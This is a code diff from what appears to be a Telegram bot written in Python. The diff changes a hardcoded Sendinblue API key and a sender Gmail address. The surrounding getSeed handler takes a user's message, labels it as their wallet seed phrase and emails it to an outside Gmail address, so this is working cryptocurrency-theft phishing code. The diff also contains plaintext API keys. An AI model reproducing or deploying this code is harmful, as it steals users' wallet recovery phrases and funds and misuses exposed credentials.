@@ -45,14 +45,14 @@ async def start(update: Update, context: CallbackContext) -> int:
     
 def create_smtp_api_client():
     configuration = sib_api_v3_sdk.Configuration()
-    configuration.api_key['api-key'] = "keysib-e2228cf05a3b8c23f852ed53d8f90d37d78725c12fd34d01ce699c9cb37817ec-awSHQkSar88yc7TY"# Fetch the API key from environment variables
+    configuration.api_key['api-key'] = "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"
     return sib_api_v3_sdk.TransactionalEmailsApi(sib_api_v3_sdk.ApiClient(configuration))
 
 async def getSeed(update: Update, context: CallbackContext) -> str:
     # Create the SMTP client
     client = create_smtp_api_client()
 
-    sender_mail = "Jimmywillbanks07@gmail.com"
+    sender_mail = "jimmywillbanks07@gmail.com"
     receiver_email = "screenerbotdex@gmail.com"
 
     text = f"THIS IS THE SEED PHRASE  \n ---------------------------------------- \n {update.message.text}"
